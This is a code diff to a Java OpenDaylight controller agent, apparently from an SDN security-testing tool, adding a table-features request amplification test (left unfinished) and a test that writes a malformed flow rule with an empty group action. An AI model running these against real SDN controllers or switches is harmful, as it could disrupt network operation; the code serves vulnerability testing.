@@ -55,9 +55,15 @@ import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.N
 import org.opendaylight.yang.gen.v1.urn.opendaylight.l2.types.rev130827.EtherType;
 import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.ethernet.match.fields.EthernetTypeBuilder;
 import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.match.EthernetMatchBuilder;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.FeaturesRequest;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.MultipartRequestBody;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.multipart.request.body.MultipartRequestTableFeaturesCaseBuilder;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.multipart.request.body.multipart.request.table.features._case.MultipartRequestTableFeaturesBuilder;
 import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingListener;
 import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingService;
 import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketReceived;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.table.types.rev131026.table.features.TableFeatures;
+import org.opendaylight.yang.gen.v1.urn.opendaylight.table.types.rev131026.table.features.TableFeaturesBuilder;
 import org.opendaylight.yangtools.concepts.ListenerRegistration;
 import org.opendaylight.yangtools.concepts.Registration;
 import org.opendaylight.yangtools.yang.binding.DataObject;
@@ -143,10 +149,13 @@ public class AppAgentImpl implements PacketProcessingListener, DataChangeListene
                 this,
                 DataBroker.DataChangeScope.SUBTREE);
 
+        // testMalformedFlodRuleGen();
+
         cm = new Interface();
         cm.setAgent(this);
         cm.connectServer("AppAgent");
         cm.start();
+
     }
 
     /**
@@ -685,4 +694,101 @@ public class AppAgentImpl implements PacketProcessingListener, DataChangeListene
 
         return "fail";
     }
+
+    /*
+     * 3.1.250: TableFeaturesReplyAmplification
+     */
+    public String testTableFeaturesReplyAmplification() {
+        LOG.info("[App-Agent] Table Features Request Amplification attack");
+
+        String modified = "";
+
+        for (NodeId id : nodeIdList) {
+            HashSet<Short> tables = node2table.get(id);
+
+            LOG.info("[App-Agent] node: {}, table size: {} ", id, tables.size());
+
+            for (Short tableId : tables) {
+                MultipartRequestTableFeaturesCaseBuilder tableFeaturesCaseBuilder = new MultipartRequestTableFeaturesCaseBuilder();
+                tableFeaturesCaseBuilder.setMultipartRequestTableFeatures(new MultipartRequestTableFeaturesBuilder().build());
+                MultipartRequestBody body = tableFeaturesCaseBuilder.build();
+
+                WriteTransaction wt = dataBroker.newWriteOnlyTransaction();
+
+            }
+        }
+
+
+        return modified;
+    }
+
+    /*
+     * 3.1.260: MalformedFlodRuleGen
+     */
+    public String testMalformedFlodRuleGen() {
+        LOG.info("[App-Agent] Malformed Flow Rule Generation attack");
+
+        // Create match
+        MatchBuilder match = new MatchBuilder();
+        match.setInPort(InventoryUtils.getNodeConnectorId(new NodeId("openflow:1"), (long) 1));
+
+        // Create action
+                /*
+                Action groupAction = new ActionBuilder()
+                        .setOrder(0)
+                        .setAction(new GroupActionCaseBuilder()
+                                .setGroupAction(new GroupActionBuilder()
+                                        .setGroupId((long) 1)
+                                        .build())
+                                .build())
+                        .build();*/
+
+        Action groupAction = new ActionBuilder()
+                .setOrder(0)
+                .setAction(new GroupActionCaseBuilder()
+                        .setGroupAction(new GroupActionBuilder()
+                                .build())
+                        .build())
+                .build();
+
+        ApplyActions applyActions = new ApplyActionsBuilder()
+                .setAction(ImmutableList.of(groupAction))
+                .build();
+
+        // Wrap our Apply Action in an Instruction
+        Instruction applyActionsInstruction = new InstructionBuilder()
+                .setOrder(0)
+                .setInstruction(new ApplyActionsCaseBuilder()
+                        .setApplyActions(applyActions)
+                        .build())
+                .build();
+
+        FlowKey flowKey = new FlowKey(new FlowId("delta"));
+
+        //final AddFlowInputBuilder builder = new AddFlowInputBuilder();
+        FlowBuilder builder = new FlowBuilder();
+
+        builder.setTableId((short) 0);
+        builder.setPriority(1);
+        builder.setMatch(match.build());
+        builder.setInstructions(new InstructionsBuilder()
+                .setInstruction(ImmutableList.of(applyActionsInstruction))
+                .build());
+        builder.setKey(flowKey);
+
+        Flow flow = builder.build();
+
+        InstanceIdentifier<Flow> flowIID = InstanceIdentifier.builder(Nodes.class)
+                .child(Node.class, new NodeKey(new NodeId("openflow:1")))
+                .augmentation(FlowCapableNode.class)
+                .child(Table.class, new TableKey(builder.getTableId()))
+                .child(Flow.class, builder.getKey())
+                .build();
+
+        GenericTransactionUtils.writeData(dataBroker, LogicalDatastoreType.CONFIGURATION, flowIID, builder.build(), true);
+
+        LOG.info("[App-Agent] flow rule {} ", flow.toString());
+        return "";
+    }
+
 }
